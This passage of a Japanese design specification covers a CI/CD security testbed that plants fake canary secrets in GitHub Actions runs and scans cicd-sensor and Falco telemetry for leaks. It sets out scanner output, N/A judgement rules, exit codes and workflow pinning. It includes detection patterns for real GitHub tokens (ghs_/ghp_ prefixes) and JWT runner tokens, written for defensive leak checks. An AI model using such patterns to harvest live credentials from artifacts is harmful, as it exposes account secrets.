生成されない。attestation predicate は特に集計のみで、次を一切含まない
（cicd-sensor のドキュメントにも明記されており、実地実行でも確認した）:

- 個別イベントの timestamp / argv / プロセスツリー（`detections` は
  ルールごとの `count` のみ）
- ファイルアクセスの**パス**（`fileAccess` フィールドは未実装）
- `collect` アクションのヒット（`detect` / `terminate` のみが載る。
  `testbed_collect_marker` が predicate に一切現れないことを実地で確認した）
- HTTP の path / host（`domains` 配列にはホスト名のみで、path/query は無い）

このため §3「観測に必要な証跡粒度」で「詳細以上」と指定されたカナリアは、
predicate しか無い状況では原理的に観測できない。§7 の N/A 判定を参照。

### アーティファクト名（実地実行 run 32510077347 で判明した不一致への対応）

`cicd-sensor-action` が standalone モードでアップロードする HTML レポートの
アーティファクト名は **`cicd-sensor-report.html`** である（`gh api
repos/<owner>/<repo>/actions/runs/<run_id>/artifacts` で実際に確認済み）。
以前の `sensor-monitor.yml` / `sensor-enforce.yml` は `name: cicd-sensor-report`
（拡張子なし）でダウンロードしようとしており、これは実際のアーティファクト名と
一致しないため常に失敗していた（`continue-on-error: true` により黙って
`telemetry-manifest.txt` に `MISSING` と記録されるだけだった）。
`cicd-sensor-attestation` の名前は元から正しい。

ワークフロー内でこのダウンロード対象アーティファクト名を
`cicd-sensor-report.html` に修正した。一方、ダウンロード後の**ローカルの
展開先フォルダ名**（`path: telemetry/cicd-sensor-report`）は意図的に
変更していない。`tools/render-matrix.py` の証跡粒度判定はこのローカルの
フォルダ名（basename）に一致させて HTML レポートの有無を判定しており、
GitHub 上のアーティファクト識別名とは独立した概念であるため。

### collect-telemetry ジョブの完全性

`sensor-monitor.yml` / `sensor-enforce.yml` の collect-telemetry ジョブ、および
`falco-analyze.yml` の analyze ジョブの telemetry 収集ステップは、期待する
アーティファクト／抽出ファイルのうちどれが実際に取得できたかを job summary と
`telemetry-manifest.txt`（各 telemetry アーティファクトに含める、収集結果一覧）
に明記する。1 つも取得できなかった場合はそのジョブを失敗させ、一部だけ
取得できた場合は `::warning::` を出して続行する（実地実行 run 32381640678 で
`cicd-sensor-report` の取得失敗が黙って進み、predicate.json 1 ファイルだけの
テレメトリが「成功」として上がっていたことが判明したための対応）。
`tools/scan-leaks.sh` は `telemetry-manifest.txt` を走査対象から除外しない
（カナリアを含まないため実害がなく、後から追跡できる利点があるため）。

### 出力

各ワークフローは `telemetry-<tool>-<mode>` という名前でアーティファクトを上げる。
`leak-scan.yml` がこれらを横断的にダウンロードして走査する。

---

## 7. 漏洩スキャナ（`tools/scan-leaks.sh` / `tools/render-matrix.py`）

### `scan-leaks.sh`

- 引数: `<スキャン対象ディレクトリ>`
- `canaries/canaries.env` を読み、各カナリア値を対象ディレクトリ配下の全ファイルから探す
- **バイナリファイル（`capture.scap` 等）も対象**。`grep -a` もしくは `strings` を使う
- **除外必須**: リポジトリのソースツリー、`canaries/` ディレクトリ、`tools/` ディレクトリ、
  スキャナ自身の出力ファイル
- 出力: `leak-report.json`（JSON）。形式は以下

```json
{
  "scanned_at": "2026-08-19T12:00:00Z",
  "run_id": "1234567890",
  "scan_root": "downloaded-artifacts",
  "telemetry_dirs": ["telemetry-cicd-sensor-monitor"],
  "scanned_file_count": 0,
  "canary_match_mode": "case_insensitive",
  "findings": [
    {
      "canary_id": "CANARY_PATH",
      "expected": "leak",
      "found": true,
      "locations": [
        {"file": "telemetry-sensor-monitor/report.html", "count": 3}
      ]
    }
  ],
  "runner_token_findings": [
    {
      "pattern": "github_token",
      "count": 2,
      "locations": [
        {"file": "telemetry-falco-analyze/capture.scap", "count": 2}
      ]
    }
  ]
}
```

- `run_id` は**走査対象の run**（`SCANNED_RUN_ID`）を記録する。
  leak-scan 自身の run（`GITHUB_RUN_ID`）ではない。
- `scan_root` は走査対象ディレクトリの呼び出し時の引数文字列（絶対パス解決前の値）を記録する。
  値そのもの（カナリア値やトークン）は含まない、単なるパス表記であることに注意する。
- `scanned_file_count` は実際に走査した候補ファイル数（`CANDIDATE_FILES` の件数）を記録する。
  `render-matrix.py` はこの値を使って「走査対象 0 件」（＝テスト不成立）を
  「期待と実測の乖離」と区別する（後述）。
- `telemetry_dirs` は、走査対象ディレクトリ（`scan_root`）の**直下**にある
  ディレクトリ名の一覧（例: `["telemetry-cicd-sensor-monitor"]`）。
  `render-matrix.py` のツール種別判定（下記「対象外（N/A）判定」参照）は
  この値を優先して使うことで、`render-matrix.py` を実行する時点で
  `scan_root` に実際にファイルシステムアクセスできるかどうかに判定結果が
  左右されなくなる。つまり `leak-report.json` 単体（＝スキャン実行時と
  異なる環境・異なるカレントディレクトリ）でも再現可能な判定になる。
- **カナリアの実値を `leak-report.json` に書かないこと**（スキャナ出力自体が漏洩源になるため）。
  `canary_id` のみ記録する。
- `canary_match_mode` は `findings`（カナリア本走査）が大文字小文字非依存
  （`case_insensitive`）で行なわれたことを示す固定値。DNS 名はリゾルバによって
  小文字に正規化されるため、`CANARY_DNS` のような値は predicate 中では
  小文字化されて現れる。以前の大文字小文字を区別する実装では、これを
  見逃す偽陰性が実地実行（run 32381640678）で発生した。`runner_token_findings`
  （二次走査）はこの値の対象外で、常に大文字小文字を区別する
  （`ghs_`/`ghp_` 等のプレフィックスや JWT の `eyJ` は大小に意味があるため）。

### 二次走査: ランナー由来トークンのパターン検出

「`capture.scap` に GitHub 発行の**本物の**トークンが実際に入るのか」は、
偽カナリアの検証とは別の、独立した検証項目である（§0 の T3 に含む）。
偽カナリアが入るのは設計上の当然だが、こちらは実際に確認する価値がある事実である。

- `leak-scan.yml` は走査対象とは**別の run** で実行されるため、実値での照合はできない。
  次の**パターン**でのみ判定する。
  - `github_token`: `ghs_` / `ghp_` / `gho_` / `ghu_` / `ghr_` に続く英数字列
  - `jwt`: `eyJ` で始まる base64url セグメントがドット区切りで 3 つ連なった形
    （`ACTIONS_RUNTIME_TOKEN` 等）
- 結果はトップレベルキー `runner_token_findings` に記録する。
  **`findings` の構造は変更しないこと**（`render-matrix.py` の既存処理を壊さないため）。
- **検出した実値は絶対に記録しない。** パターン種別・件数・ファイル名のみ。
  カナリアと同じ原則。
- 既知のカナリア値に一致するものは除外する
  （偽の `ghp_` 様カナリアが二重計上されるのを防ぐため）。
- 除外ロジック（リポジトリのソースツリー、`canaries/`、`tools/`）はカナリア走査と共通。

### `render-matrix.py`

- `leak-report.json` を読み、Markdown の表を出力する
- **`$GITHUB_STEP_SUMMARY`（または `--out`）に書く場合でも、必ず同じ内容を標準出力にも出す。**
  `GITHUB_STEP_SUMMARY` が設定されているからといって標準出力への出力を省略しないこと
  （省略すると、ステップのログが空のまま失敗するだけの分かりにくい見え方になる。実際に
  この不具合が起きたことがある）
- 各行: カナリア ID / 注入経路 / 期待 / 実測 / 判定
- 判定は `期待 == 実測` なら ✅、乖離していれば ⚠️
- `runner_token_findings` を**独立したセクション**として出力する。
  - **この結果は exit code に影響させない。** 終了コードの判定はカナリアのみを対象とする。
    ランナー由来トークンの検出は「発見」であって「失敗」ではないため
  - どのツールの出力に、どの種類のトークンが、いくつ入っていたかが読んで分かる出力にする
  - `runner_token_findings` キーが無い旧形式の JSON でも例外にせず処理を続けること
- 引数は `python3 tools/render-matrix.py <leak-report.json> [--out <出力先>]`
- Python 3 標準ライブラリのみ使用。外部依存を追加しない

#### 終了コード

| exit code | 意味 |
| --- | --- |
| `0` | 全カナリアが期待どおり（乖離なし） |
| `1` | 期待と実測の乖離あり（＝調査上の「発見」。⚠️ が 1 つでもあれば非ゼロで終了し、CI 上で目立たせる） |
| `2` | 走査不成立（テスト自体が成立していない。後述） |

- `1` で終了する場合、**どのカナリアがどう食い違ったかを `::error::` 注釈として標準出力に出す**こと
  （GitHub Actions の UI に拾わせるため）。
- 終了直前に、判定の一行サマリを標準出力に出す。例:
  `RESULT: 10 canaries checked, 3 mismatch(es) -> exit 1`

#### 走査不成立（exit 2）の判定

「走査対象が 0 件だった」ケース（telemetry アーティファクトが存在しない、ダウンロードに
失敗した等）と、「本当に期待と実測が食い違った」ケースは意味が異なる。前者はテストベッド
側・インフラ側の問題であって「発見」ではないため、独立したエラーとして区別する。

- `leak-report.json` の `scanned_file_count` が `0`、または
  `scanned_file_count` キーが存在せず（後方互換のための救済策）かつ全カナリアが
  `found=false` の場合、**カナリアの乖離判定を一切行なわず**、専用のエラーメッセージを
  標準出力・`$GITHUB_STEP_SUMMARY`・`::error::` 注釈のすべてに出して **exit 2** で終了する。
  - メッセージ例:「走査対象のファイルが 0 件でした。対象 run に telemetry-* アーティファクトが
    存在しないか、ダウンロードに失敗した可能性があります。カナリアの判定は行なっていません」
- `scanned_file_count` が `1` 以上であれば、たとえ全カナリアが `found=false` でも
  それは正当な実測結果として扱い、通常どおり判定する（exit 2 にはしない）。
- `scanned_file_count` キーが無い古い形式の `leak-report.json` でも例外を起こさないこと。

#### 対象外（N/A）判定：走査対象テレメトリの種別によるカナリアの絞り込み

カナリアの期待値は「どのツールのテレメトリを見ているか」に依存する（§3「適用範囲」列）。
`CANARY_SCAP`（falco 固有）を cicd-sensor 単独の run に対して走査すると、
`capture.scap` 自体が存在しないため必ず `found=false` になる。これは「期待と実測が
食い違った（発見）」ではなく「そもそも判定できない組み合わせ（対象外）」であり、
他のカナリアと同じ ⚠️ にしてはいけない。

- `render-matrix.py` は `leak-report.json` の `telemetry_dirs`
  （無ければ `scan_root` 直下のディレクトリ名を `os.listdir` で取得した
  フォールバック）から、走査対象に含まれるツールの種別を判定する
  （`telemetry-cicd-sensor-*` → cicd-sensor、`telemetry-falco-*` → falco。
  実際のアーティファクト名は §8 参照）。
- 走査対象に、あるカナリアの「適用範囲」（§3）に含まれるツールのテレメトリが
  1 つも含まれていない場合、そのカナリアは ⚠️ ではなく **N/A（対象外）** と表示し、
  乖離件数にも exit code にも算入しない。
- マトリクスの冒頭に、今回走査したテレメトリの種別（判定できた場合）または
  「判定不能」（後述）を明記する。読み手が「なぜ N/A なのか」を理解できるようにするため。
- **ツール種別が判定不能な場合のフォールバック**: `telemetry_dirs` が無く、
  かつ `scan_root` にアクセスできない場合（ディレクトリが既に存在しない、
  `leak-report.json` だけを後から別環境で読む場合等）や、直下のディレクトリ名が
  既知の `telemetry-*` パターンに一つも一致しない場合は、判定不能として扱う。
  この場合の扱いはカナリアの「適用範囲」（§3）によって異なる。
  - **両方のツールに適用されるカナリア**（`CANARY_SCAP` 以外の全て）は、
    ツール種別が判定できなくてもどのみち判定対象になるので、
    通常どおり判定する（安全側に倒して見逃さないため）。
  - **ツール固有のカナリア**（現状 `CANARY_SCAP` のみ、falco 固有）は、
    ツール種別が判定できない以上「そのツールのテレメトリを見ているか」を
    確認しようがないため、**N/A（対象外）** と表示し、乖離件数にも
    exit code にも算入しない。
    以前の実装は「安全側に倒して全カナリアを判定対象にする」だったが、
    これは cicd-sensor 単独の run（`capture.scap` が存在しない）を
    走査した際に判定不能となった場合、`CANARY_SCAP` が
    `found=false` vs `expected=leak` で必ず ⚠️（exit 1）になる誤検知を
    生んでいた。ツール固有カナリアに限って N/A に倒すことでこれを解消する。

#### 対象外（N/A）判定：証跡の粒度によるカナリアの絞り込み（実地実行 run 32381640678 で追加）

上記の「ツール種別による N/A」とは独立に、証跡の**粒度**によるもう一つの N/A 判定を行なう。
§6 のとおり、cicd-sensor の standalone モードで得られる attestation predicate は集計のみで、
個別イベントの timestamp / argv / プロセスツリー、ファイルアクセスのパス、`collect`
アクションのヒット、HTTP の path/host を一切含まない。§3「観測に必要な証跡粒度」で
「詳細以上」と指定されたカナリア（`CANARY_PATH` / `CANARY_FILE` / `CANARY_ARGV_SHORT` /
`CANARY_ARGV_LONG` / `CANARY_ARGV_FLAG` / `CANARY_URL_QUERY` / `CANARY_URL_PATH`）は、
predicate（集計レベル）しか無い状況では原理的に観測できない。「漏れなかった」のではなく
「見る場所が無い」ため、これらを ⚠️ として扱ってはいけない。

- `render-matrix.py` は `scan_root` 配下を走査し、次の 3 段階で証跡の粒度を判定する
  （低い順）:
  - `aggregate`（集計）: `cicd-sensor-attestation`（predicate.json）のみ
  - `detail`（詳細）: `cicd-sensor-report`（HTML レポート）、または
    `telemetry-falco-*` 配下に何らかのテレメトリ（`falco_events.json` や
    抽出ファイル等の個別イベント情報）がある
  - `raw`（生）: `telemetry-falco-*` 配下に `capture.scap` がある
- 判定できた証跡の粒度が、そのカナリアが要求する最低粒度に満たない場合、⚠️ ではなく
  **N/A（この証跡粒度では観測不能）** と表示し、乖離件数にも exit code にも算入しない。
  カナリアごとの最低要求粒度は `tools/render-matrix.py` の `CANARY_MIN_GRANULARITY` に
  定義する:
  - `detail` 以上を要求: `CANARY_PATH` / `CANARY_FILE` / `CANARY_ARGV_SHORT` /
    `CANARY_ARGV_LONG` / `CANARY_ARGV_FLAG` / `CANARY_URL_QUERY` / `CANARY_URL_PATH`
  - `raw` を要求: `CANARY_SCAP`（実地実行 run 32643269616 で追加。下記参照）
  - 要求なし（`aggregate` でも判定対象）: `CANARY_ENV` / `CANARY_DNS`
- `CANARY_DNS` は predicate の `domains` 配列に host 単位で載るため、この N/A 判定の
  対象に**含めない**（集計レベルでも判定対象。今回の実地実行で確認した唯一の有効な観測）。
- **`CANARY_SCAP` は `raw`（`capture.scap` そのもの）を要求する。** 以前はこの仕組みの
  対象外で、「falco 固有 N/A（`CANARY_APPLIES_TO`）で別途カバーされている」という想定
  だった。しかし実地実行（run 32643269616、falco-live-forked の run 32625231129 を対象に
  した leak-scan）で、falco の live モードのテレメトリ（`falco_events.json` 等。
  `capture.scap` は live モードでは作られない）に対して走査したところ、ツール種別 N/A は
  通過してしまい（falco のテレメトリなので `CANARY_SCAP` の適用範囲には合致する）、
  証跡粒度チェックの対象外だったため何のチェックも行なわれず、`found=false` と
  `expected=leak` が単純に食い違って ⚠️（誤検知）になった。`CANARY_SCAP` の期待は
  「falco の capture.scap でのみ漏れる」であり、capture.scap 自体が走査対象に無ければ
  `raw` 粒度の証跡が無いことになるので、他の「詳細以上」カナリアと同じ仕組みで、
  より高い `raw` 粒度を要求するよう修正した。
- マトリクスの冒頭に、今回の走査で利用できた証跡の粒度を明記する。
- `scan_root` にアクセスできない場合は判定不能として扱い、ツール種別による N/A と同様に
  安全側に倒して全カナリアを通常どおり判定する。
- **ツール種別による N/A とこの証跡粒度による N/A は独立した仕組みであり、両方が同時に
  機能する。** 一方がすでに N/A と判定していれば、そちらの理由が優先される。
- **この証跡粒度 N/A・後述の http_request サポート N/A は、いずれも
  「informational（採点対象外）と判定されたカナリアには適用しない」。** 詳細は
  次項「採点対象（scored）／参考情報（informational）の区別」を参照。

#### 対象外（N/A）判定：センサーの機能サポートによるカナリアの絞り込み

上記 2 つとは独立した、**3 つ目の N/A 判定**。実地実行（run 32519409901）で判明した
次の事実に対応する。

- **平文 HTTP を捕捉する `http_request` イベントは、cicd-sensor の
  リリース済みバージョンにまだ存在しない。** 実装は 2026-08-11
  （cicd-sensor の commit `bdec37f2`, PR #139）で、`releases/v0.0.45`（2026-08-09）にも
  含まれず、main にしかない。テストベッドがピン留めしている
  `cicd-sensor-action` v0.0.38（2026-06-13）はもちろん未対応。
- 未対応のイベント型を使ったルールは、**エラーにならず、ただ発火しない**。
  唯一の手がかりはレポートの `rules_summary.warnings_count` が増えることだけである。
- **`cicd-sensorctl rule validate`（main からビルドしたもの）はこのルールを通してしまう**ため、
  ローカル検証ではこの不整合を検出できない。

したがって `CANARY_URL_PATH` / `CANARY_URL_QUERY` は、`http_request` のサポートが
確認できない限り観測不能である。

**特に重要**: この状況で `CANARY_URL_QUERY`（期待 = 漏れない）を ✅ にしてはいけない。
クエリ文字列が eBPF 内で除去されたからではなく、**HTTP イベントがそもそも捕捉されていない**
からである。これを ✅ とするのは「証拠の不在を証拠として扱う」誤りにあたる。

- `scan-leaks.sh` は HTML レポート（`window.REPORT_DATA` に埋め込まれた二重エンコードの
  JSON）から `rules_summary` と `hits[]` の `event_type` を抽出し、
  `sensor_capabilities` としてトップレベルに記録する。
  判定は次の 3 値:
  - `supported`: `hits[]` に `http_request` のヒットが 1 件以上ある
  - `unsupported`: `http_request` のヒットが 0 件、かつ `warnings_count > 0`（**推定**）
  - `unknown`: 上記以外。判断がつかないため安全側に倒す
- `render-matrix.py` は `supported` 以外の場合、`CANARY_URL_PATH` / `CANARY_URL_QUERY` を
  **N/A（この cicd-sensor バージョンでは `http_request` 未対応のため観測不能）** と表示し、
  乖離件数にも exit code にも算入しない。表示文言は「漏れなかった」と誤読されないものにする。
- `unsupported` はあくまで**推定**である（他のルールが原因で `warnings_count` が
  増える可能性は理論上残る）。出力にもその旨を明記する。

#### 採点対象（scored）／参考情報（informational）の区別（実地実行 run 32643269616 で追加）

上記 3 つの N/A 機構（ツール種別 / 証跡粒度 / センサーの機能サポート）とは**独立した
4つ目の軸**。leak-scan（run 32643269616）を falco-live の run（32625231129）に対して
実行したところ、`CANARY_PATH` / `CANARY_ARGV_SHORT` / `CANARY_DNS` / `CANARY_SCAP`
の4件が ⚠️（乖離）と判定されて失敗した。対象テレメトリ
（`telemetry-falco-live-forked-0.44.1`）を実際に展開して確認したところ、
`capture.scap` は含まれず（live モードは生キャプチャを作らない）、検知イベントは
80 件すべて `Source Code Overwrite` だった。

**この4件はすべて構造的に成立しえないもので、真の発見ではなかった。**

- `CANARY_SCAP`: `capture.scap` が live モードには存在しない（→上記「証跡の粒度」の
  `raw` 要求で対応）。
- `CANARY_PATH`: 唯一発火した `Source Code Overwrite` の条件は
  `/home/runner/work/` 配下への書き込みで、`/tmp/${CANARY_PATH}/...` は対象外。
- `CANARY_ARGV_SHORT`: falco の7ルールに curl に一致するものが無く、argv が出力に
  現れる経路が存在しない。
- `CANARY_DNS`: live モードに DNS を扱うルールが無い（DNS 抽出は analyze モードの
  chisel 機能）。

**本質的な問題**: これらのカナリアは cicd-sensor の redaction 挙動を検証するために
設計されたものである。検証している仮説は「12 バイト超の argv 切り詰め」
「キーワード依存の redaction」「パスは redact されない」といった、cicd-sensor の
実装詳細である。**falco には redaction 層が存在しない。** falco の出力はルールの
`output:` テンプレートに書かれた内容がそのまま出るだけなので、「カナリアが現れるか」は
「どのルールが発火し、そのテンプレートに何が含まれるか」で決まる、まったく別の問い
である。同じ期待値で採点するのが誤りだった。

この違いを表現するため、カナリアごとに「そのツールに対して採点可能な仮説を
持っているか」を区別する:

- **scored（採点対象）**: 期待値との一致・乖離を判定し、exit code に算入する
- **informational（参考情報）**: 検出の有無は表示するが、✅/⚠️ を付けず exit code
  にも算入しない

対応表（§3 の表と同じ内容）:

| カナリア | cicd-sensor | falco |
| --- | --- | --- |
| `CANARY_ENV` | scored | scored |
| `CANARY_FILE` | scored | scored |
| `CANARY_PATH` | scored | informational |
| `CANARY_ARGV_SHORT` | scored | informational |
| `CANARY_ARGV_LONG` | scored | informational |
| `CANARY_ARGV_FLAG` | scored | informational |
| `CANARY_URL_QUERY` | scored | informational |
| `CANARY_URL_PATH` | scored | informational |
| `CANARY_DNS` | scored | informational |
| `CANARY_SCAP` | （対象外・既存のツール N/A のまま） | scored（raw 粒度を満たす場合のみ。上記参照） |

`CANARY_ENV` と `CANARY_FILE` を両方 scored に残す理由: 「環境変数の値を収集するか」
「ファイルの中身を読むか」は、redaction の有無に関係なくどちらのツールにも問える
共通の問いだからである。

実装 (`tools/render-matrix.py`):

- `CANARY_SCORED_FOR`: カナリアごとに「scored として扱うツール」の集合を定義する
  （`CANARY_APPLIES_TO` とは別のマップ）。
- `is_informational(canary_id, present_tools)`: 走査対象に含まれるツールのうち、
  1つでもそのカナリアを scored として扱うツールがあれば scored のまま（安全側）。
  どのツールも scored として扱わない場合のみ informational と判定する。
  ツール種別が判定不能（`present_tools is None`）な場合は、以前と同じ安全側
  （scored）に倒す。
- 判定順序: ①ツール種別 N/A → ②scored/informational の判定 → （scored の場合のみ）
  ③ http_request サポート N/A → ④証跡粒度 N/A → ⑤通常の ✅/⚠️ 判定。
  informational と判定されたカナリアは③④のいずれのチェックも行なわず、そのまま
  参考情報として表示する（③④はいずれも「scored だが観測できない」ケースのための
  仕組みであり、そもそも scored でないカナリアには意味を持たないため）。
- 表示: informational の行は判定列に `✅`/`⚠️` の代わりに
  「参考（このツールには採点可能な仮説が無い）」と表示する。実測列には
  「漏れた／漏れなかった」の事実を引き続き表示する（観測結果としては有用なため）。
- マトリクスの末尾に、falco には redaction 層が無く出力がルールの `output:`
  テンプレート依存であることを説明する注記を出す。
- `RESULT:` 行に `scored` / `informational` / `N/A` の内訳を出す
  （例: `RESULT: 10 canaries checked (2 scored, 7 informational, 1 N/A (1 N/A granularity)), 0 mismatch(es) -> exit 0`）。

#### `rules_summary` の可視化（必須）

**今回の教訓は「ルールが静かに無効化されても気づけない」ことである。**

- `render-matrix.py` は `rule_count` と `warnings_count` を**必ずマトリクス冒頭に表示**する。
- `warnings_count > 0` の場合は `::warning::` 注釈を出し、「ルールの一部が読み込まれて
  いない可能性がある。使用している cicd-sensor のバージョンが、ルールで使っている
  イベント型に対応しているか確認すること」と示す。
- これは exit code には影響させない（発見であって失敗ではないため）。

#### leak-scan.yml の対象にできるワークフロー

`leak-scan.yml` は、カナリアを実際に注入するワークフロー（`falco-live.yml` /
`falco-analyze.yml` / `sensor-monitor.yml`）の run_id のみを対象にできる。
`sensor-enforce.yml` はカナリアを注入しない（`90-killme.sh` は `load_canaries` を
呼ばない。§4）ため対象外であり、`leak-scan.yml` はダウンロード直後にこれを検出して
早期にジョブを失敗させる（§8）。

---

## 8. ワークフロー仕様

全ワークフロー共通:

- トリガーは `workflow_dispatch` のみ。**`push` / `pull_request` では起動しない**
  （public repo で不用意に走らないため）
- `permissions:` は各ワークフローで明示的に最小化する
- `runs-on` は §8 の表に従う
- すべての `uses:` は**コミット SHA でピン留め**し、行末コメントにバージョンを書く。
  **例外 (検証用・一時的)**: `falco-live.yml` の `live-forked` ジョブが使う
  `fiord/falco-actions/start` / `stop`（自分 (fiord) が管理する fork）のみ、
  `fix/cicd-rules-mount-path` ブランチへの継続的な追加修正を追随するため、
  SHA pin ではなくブランチ参照にしている。upstream
  (`falcosecurity/falco-actions`、`live` ジョブ) 側は SHA pin のまま維持する。
  **検証が完了し fork 側の修正が安定したら、必ずコミット SHA pin に戻すこと。**
  該当箇所は該当ステップ直上のコメントと docs/SAFETY.md のチェックリストを参照
- 各ワークフローの冒頭に、そのワークフローが何を検証するかの `name:` と コメントを書く

| ワークフロー | runs-on | 目的 | 特記事項 |
| --- | --- | --- | --- |
| `falco-live.yml` | `ubuntu-latest` | falco live モードでの検知、および upstream falco-actions の cicd-rules マウントパスバグと fork 修正版の比較 | **2 ジョブ / 3 leg 構成。** `live` ジョブ: upstream `falcosecurity/falco-actions` を使い、`falco-version` を `0.39.0` と `0.39.2` の matrix にする（使用イメージは `falcosecurity/falco-no-driver` にハードコードされている）。`live-forked` ジョブ: fork 修正版 `fiord/falco-actions@fix/cicd-rules-mount-path`（ブランチ参照。**検証用の一時的な例外** — 上記「全ワークフロー共通」参照。修正の起点は commit 360d62c72985b790bff96abde043b14ae053efe5、https://github.com/fiord/falco-actions/commit/360d62c72985b790bff96abde043b14ae053efe5 ）を使う。この fork ブランチは cicd-rules のマウントパス修正に加え、使用イメージ自体も `falcosecurity/falco-no-driver` から、維持されている `falcosecurity/falco` に切り替えているため、`live-forked` ジョブの `falco-version` は `0.44.1`（falcosecurity/falco の Docker Hub 上の実際の最新）固定の 1 leg にする（`uses:` に式を使えないため、action 参照先を matrix で切り替えられず別ジョブにする必要がある）。upstream の `start/action.yaml:70` は CI/CD ルール（`cicd-rules`、既定 `true`）のマウント元パスが `github.action_path`（`start/` を指す）からの相対パスになっており、実体であるリポジトリ直下の `rules/` を指せず、CI/CD ルールが一度もロードされない（デフォルト動作で検知が 0 件になるバグ）。fork 修正版はこのパスを `../rules/...` に修正済み。両ジョブとも起動ログ（`falco_start_logs.txt`）から `cicd_rules.yaml` / `rules.d` への言及の有無を判定し job summary に記録する（観測目的でジョブは失敗させない）。**なぜ upstream leg (`live` ジョブ) は 0.39.x が上限か**: falcosecurity/falco-no-driver イメージ（falco-actions がハードコードして使う）は Docker Hub 上の数値タグが `0.39.2` で公開停止しているため、`required_engine_version: 0.43.0` を満たすバージョンはそもそも指定できない。`live-forked` ジョブは維持されている `falcosecurity/falco` イメージを使うため、`required_engine_version: 0.43.0` を満たす `0.44.1` を指定できる。**`live-forked` ジョブが検証したいのは次の3点**: (1) 維持されているイメージの新しい Falco (0.44.1) が現在のランナーのカーネル (6.17) で起動し続けられるか、(2) `cicd-rules` のパス修正により CI/CD 特化ルールがロードされるか、(3) 実際に検知イベントが出るか。各ジョブは falco-actions を呼ぶ前に Docker Hub のタグ API を叩く preflight ステップでタグの実在を確認する（`live` ジョブは `falcosecurity/falco-no-driver`、`live-forked` ジョブは `falcosecurity/falco` を対象にする）。`fail-fast: false`（ただし preflight 自体がタグ不在で失敗した場合はそのジョブを fail-fast させてよい。原因が明確なため）。3 leg はそれぞれ異なるテレメトリアーティファクト名（`telemetry-falco-live-0.39.0` / `telemetry-falco-live-0.39.2` / `telemetry-falco-live-forked-0.44.1`）を使う |
| `falco-analyze.yml` | `ubuntu-latest` | falco analyze モードでの検知と生キャプチャ | `custom-rule-file` に CI/CD ルールを**明示的に渡す**（渡さないと効かないため）。`falco-version` は `0.39.2`（falcosecurity/falco-no-driver の実際の上限。理由は上記と同じ）。`analyze` ジョブは falco-actions/analyze を呼ぶ前に同様の preflight ステップでタグの実在を確認する。`upload_raw_capture` 入力で scap のアップロードを制御（既定 `false`）。**ジョブを停止するガードは置かない**（§1-6）。public リポジトリで実行された場合は、`capture.scap` に何が入りうるかを `::warning::` と job summary で告知する情報提供ステップのみを置く |
| `sensor-monitor.yml` | `ubuntu-24.04` | cicd-sensor の検知（自作ルールでの kill は起きない想定） | `monitor_mode` はコミット値で `false`（§5。config.yaml はコミット SHA から取得されるため、`monitor_mode` はワークフローごとに切り替えられずリポジトリ全体で共通。§5「sensor-monitor.yml への影響」参照）。全シナリオを実行 |
| `sensor-enforce.yml` | `ubuntu-24.04` | cicd-sensor の kill 動作 | `monitor_mode` はコミット値で `false`（上記と同一の値。§5）。§5 の 2 ジョブ構成。`90-killme.sh` は `load_canaries` を呼ばずカナリアを注入しないため、**この run の run_id は `leak-scan.yml` の対象にできない**（§4、§7） |
| `leak-scan.yml` | `ubuntu-latest` | 漏洩マトリクスの生成 | 入力で対象 run_id を受け取り、その run のアーティファクトを DL して走査。ダウンロード結果が空、または `telemetry-cicd-sensor-enforce` のみだった場合はジョブを早期に落とすガードを持つ（§7） |

### falco-actions / cicd-sensor-action のバージョン

- `cicd-sensor-action`: README にある `6511eb44c91d71b2b93d71193b1bf2cb18352f66`（v0.0.38）を使う
- `falco-actions`: このリポジトリにはタグがないため、**実装者は SHA を確定できない**。
  `falcosecurity/falco-actions/start@<PIN_ME>` のようにプレースホルダを置き、
  README に「利用者が SHA を確定して差し替える」旨を明記すること。**推測の SHA を書かない**
- `live-forked` ジョブが使う fork (`fiord/falco-actions`) のみ、検証用の一時的な
  例外としてブランチ参照 (`fix/cicd-rules-mount-path`) を使ってよい。検証完了後は
  SHA pin に戻すこと（上記「全ワークフロー共通」参照）

---

## 9. ドキュメント

### `README.md`

- このリポジトリが何であるか（検証用であり、production に入れるものではない）
- `upload_raw_capture` を有効にすると生キャプチャが誰でもダウンロード可能になる旨と、
  **それでも public repo で実行してよいと判断した根拠**（§1-6）、および
  **再評価が必要な条件**
- セットアップ手順（`CANARY_ENV` シークレットの登録、falco-actions の SHA 確定、
  `cicd-sensorctl` の入手経路が未検証である旨）
- 各ワークフローの実行方法と、期待される結果
- `sensor-enforce.yml` だけは「成功が正常」である旨

### `TEST-PLAN.md`

- §3 のカナリア表と §4 のシナリオ表を、実行順序とともに記述
- 各シナリオがどのツールのどのルールに対応する想定かの対応表

### `SAFETY.md`

- §1 の安全制約を、なぜそうするのかの理由付きで記述
- 「このリポジトリを fork / 流用する人が守るべきこと」の形式で書く

### `RESULTS-TEMPLATE.md`

- 実行結果を記入するためのテンプレート
- T1 / T2 / T3-a / T3-b それぞれの結果欄と、report の仮説との突き合わせ欄

---

## 10. 実装時の禁止事項

- 推測でファイルパス・フィールド名・アクション SHA を書かない。
  不明な場合はプレースホルダにして README に明記する
- `cicd-sensor` / `falco-actions` の**元リポジトリを一切変更しない**（読み取りのみ）
- 実在のマルウェア・IOC・攻撃者インフラを参照しない
- `curl | sh` 形式のインストールを書かない
- 本物の認証情報・実在サービスの API キー形式に酷似した値を使わない
  （`ghp_` 等のプレフィックスは redaction テストのため `CANARY_ARGV_FLAG` の文脈でのみ許容）
